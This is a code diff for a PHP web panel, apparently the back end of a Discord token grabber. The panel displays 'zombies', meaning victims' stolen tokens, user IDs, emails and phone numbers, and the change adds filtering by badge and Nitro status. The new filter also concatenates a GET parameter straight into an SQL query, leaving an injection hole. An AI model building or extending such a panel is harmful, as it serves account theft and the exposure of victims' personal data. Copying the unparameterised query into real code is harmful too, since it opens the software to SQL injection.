@@ -56,35 +56,55 @@
     </section>
 
     <section class="section_zombies">
-        <!-- <div class="filtre">
-            <select onchange="SearchByGrade(this)" id="searcg_by_badges" name="searcg_by_badges" class="select-button">
+        <div class="filtre">
+            <select onchange="SearchByGrade(this)" id="search_by_badges" name="search_by_badges" class="select-button">
                 <option value="all">Grades: All</option>
-                <option value="balance">Grades: Balance</option>
-                <option value="bravery">Grades: Bravery</option>
-                <option value="brilliance">Grades: Brillance</option>
-                <option value="bughunter">Grades: BugHunter</option>
-                <option value="dev">Grades: Dev</option>
-                <option value="early">Grades: Early</option>
-                <option value="hypesquad">Grades: HypeSquad</option>
-                <option value="partner">Grades: Partner</option>
-                <option value="staff">Grades: Staff</option>
-                <option value="verified">Grades: Verified</option>
+                <option value="256">Grades: Balance</option>
+                <option value="64">Grades: Bravery</option>
+                <option value="128">Grades: Brillance</option>
+                <option value="8">Grades: BugHunter</option>
+                <option value="131072">Grades: Dev</option>
+                <option value="512">Grades: Early</option>
+                <option value="4">Grades: HypeSquad</option>
+                <option value="2">Grades: Partner</option>
+                <option value="1">Grades: Staff</option>
+                <!-- <option value="verified">Grades: Verified</option> -->
                 <option value="nitroboost">Grades: Nitro Boost</option>
                 <option value="nitrocl">Grades: Nitro Classic</option>
             </select>
-            <input type="text" placeholder="Search Username..." class="select-input" onkeyup="SearchByUsername(this)"> -->
+            <!-- <input type="text" placeholder="Search Username..." class="select-input" onkeyup="SearchByUsername(this)"> -->
             <!-- <button class="select-button" onclick="CheckTokens()">Check All Tokens</button> -->
-        <!-- </div> -->
+        </div>
         <div id="zombies" class="zombies">
             <?php
                 global $bdd;
 
-                $resp = $bdd->query('SELECT * FROM tokens');
+                if(isset($_GET['badge']) && !empty($_GET['badge'])) {
+                    $badge = htmlspecialchars($_GET['badge']);
+                    if($badge == "all") {
+                        $resp = $bdd->query('SELECT * FROM tokens');
+                    } else if ($badge == "nitrocl") {
+                        $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 1');
+                    } else if ($badge == "nitroboost") {
+                        $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 2');
+                    } else {
+                        $resp = $bdd->query('SELECT * FROM tokens WHERE badges = ' . $badge);
+                    }
+                    
+                } else {
+                    $resp = $bdd->query('SELECT * FROM tokens');
+                }
                 
                 while ($user = $resp->fetch()) {
             ?>
                 <div class="zombie">
-                    <img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset="">
+                    <?php
+                        if(!empty($user['avatar']) AND $user['avatar'] != null){
+                            ?><img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset=""><?php
+                        } else {
+                            ?><img class="user_pfp" src="assets/images/Default.png" alt="" srcset=""><?php
+                        }
+                    ?>
                     <span><?=$user['username']?> (<?=$user['user_id']?>)</span>
                     <p><?=$user['email']?></p>
                     <p><?=$user['phone']?></p>
@@ -130,6 +150,8 @@
     <footer>
         Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
     </footer>
-    
+
+    <script src="assets/js/filter.js"></script>
+
 </body>
 </html>
